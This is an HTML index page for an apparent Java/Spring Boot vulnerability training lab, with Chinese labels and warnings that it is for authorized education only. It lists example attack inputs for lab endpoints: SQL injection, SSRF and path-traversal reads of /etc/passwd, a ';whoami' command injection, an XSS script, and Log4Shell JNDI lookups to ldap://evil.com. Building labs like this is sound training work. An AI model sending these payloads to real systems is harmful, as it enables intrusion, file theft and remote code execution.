@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mini Java Vulnerability Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .warning {
+            background: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .warning::before {
+            content: "⚠️ ";
+            font-size: 1.2em;
+        }
+
+        .vuln-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .vuln-card {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .vuln-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .vuln-card h3 {
+            color: #1e3c72;
+            margin-bottom: 15px;
+            font-size: 1.4em;
+            display: flex;
+            align-items: center;
+        }
+
+        .vuln-card h3::before {
+            content: attr(data-icon);
+            margin-right: 10px;
+            font-size: 1.5em;
+        }
+
+        .vuln-card p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .endpoint {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 0.9em;
+            color: #333;
+        }
+
+        .endpoint .label {
+            font-weight: bold;
+            color: #1e3c72;
+        }
+
+        .endpoint .url {
+            word-break: break-all;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+
+        .badge-vuln {
+            background: #ff4444;
+            color: white;
+        }
+
+        .badge-sec {
+            background: #00c851;
+            color: white;
+        }
+
+        .footer {
+            text-align: center;
+            color: white;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+
+        .cve {
+            background: #ff9800;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 Mini Java Vulnerability Lab</h1>
+            <p>小型Java安全漏洞靶场 - 仅供安全研究与教育使用</p>
+        </div>
+
+        <div class="warning">
+            <strong>警告：</strong>此环境包含真实的安全漏洞代码，仅用于授权的安全测试和教育目的。
+            请勿在生产环境或未经授权的系统上使用！
+        </div>
+
+        <div class="vuln-grid">
+            <!-- SQL Injection -->
+            <div class="vuln-card" data-icon="💉">
+                <h3>SQL Injection</h3>
+                <p><strong>SQL注入漏洞</strong> - 用户输入直接拼接到SQL语句中</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">漏洞:</span><br>
+                    <span class="url">GET /sqli/jdbc/vuln?username=admin' OR '1'='1</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-sec">SEC</span>
+                    <span class="label">安全:</span><br>
+                    <span class="url">GET /sqli/jdbc/sec?username=admin</span>
+                </div>
+                <p>更多: /sqli/like/vuln, /sqli/order/vuln</p>
+            </div>
+
+            <!-- SSRF -->
+            <div class="vuln-card" data-icon="🌐">
+                <h3>SSRF</h3>
+                <p><strong>服务端请求伪造</strong> - 可读取内网资源和文件</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">漏洞:</span><br>
+                    <span class="url">GET /ssrf/urlconnection/vuln?url=file:///etc/passwd</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-sec">SEC</span>
+                    <span class="label">安全:</span><br>
+                    <span class="url">GET /ssrf/urlconnection/sec?url=http://example.com</span>
+                </div>
+                <p>更多: /ssrf/httpurl/vuln, /ssrf/httpclient/vuln</p>
+            </div>
+
+            <!-- Command Injection -->
+            <div class="vuln-card" data-icon="⌨️">
+                <h3>Command Injection</h3>
+                <p><strong>命令注入</strong> - 系统命令执行漏洞</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">漏洞:</span><br>
+                    <span class="url">GET /cmd/ping/vuln?host=8.8.8.8;whoami</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-sec">SEC</span>
+                    <span class="label">安全:</span><br>
+                    <span class="url">GET /cmd/ping/sec?host=8.8.8.8</span>
+                </div>
+                <p>更多: /cmd/runtime/vuln, /cmd/processbuilder/vuln</p>
+            </div>
+
+            <!-- XSS -->
+            <div class="vuln-card" data-icon="🎯">
+                <h3>XSS</h3>
+                <p><strong>跨站脚本攻击</strong> - 反射型和存储型XSS</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">反射型:</span><br>
+                    <span class="url">GET /xss/reflect?vuln=&lt;script&gt;alert(1)&lt;/script&gt;</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">存储型:</span><br>
+                    <span class="url">GET /xss/stored/store?data=&lt;script&gt;alert(1)&lt;/script&gt;</span>
+                </div>
+                <p>安全: /xss/reflect/sec</p>
+            </div>
+
+            <!-- Log4Shell -->
+            <div class="vuln-card" data-icon="📝">
+                <h3>Log4Shell <span class="cve">CVE-2021-44228</span></h3>
+                <p><strong>Log4j2 JNDI注入</strong> - 远程代码执行漏洞</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">基础:</span><br>
+                    <span class="url">GET /log4j/vuln?token=${jndi:ldap://evil.com/exp}</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">Header:</span><br>
+                    <span class="url">GET /log4j/header -H "User-Agent: ${jndi:ldap://evil.com/exp}"</span>
+                </div>
+                <p>更多: /log4j/login, /log4j/search, /log4j/bypass</p>
+            </div>
+
+            <!-- Path Traversal -->
+            <div class="vuln-card" data-icon="📁">
+                <h3>Path Traversal</h3>
+                <p><strong>路径遍历</strong> - 任意文件读取漏洞</p>
+                <div class="endpoint">
+                    <span class="badge badge-vuln">VULN</span>
+                    <span class="label">漏洞:</span><br>
+                    <span class="url">GET /path/traversal/vuln?filename=../../../../../etc/passwd</span>
+                </div>
+                <div class="endpoint">
+                    <span class="badge badge-sec">SEC</span>
+                    <span class="label">安全:</span><br>
+                    <span class="url">GET /path/traversal/sec?filename=test.txt</span>
+                </div>
+                <p>更多: /path/image/vuln, /path/absolute/vuln</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>⚠️ 此靶场仅用于安全研究和教育目的</p>
+            <p>运行环境: Java 8 + Spring Boot 2.7.18</p>
+        </div>
+    </div>
+</body>
+</html>
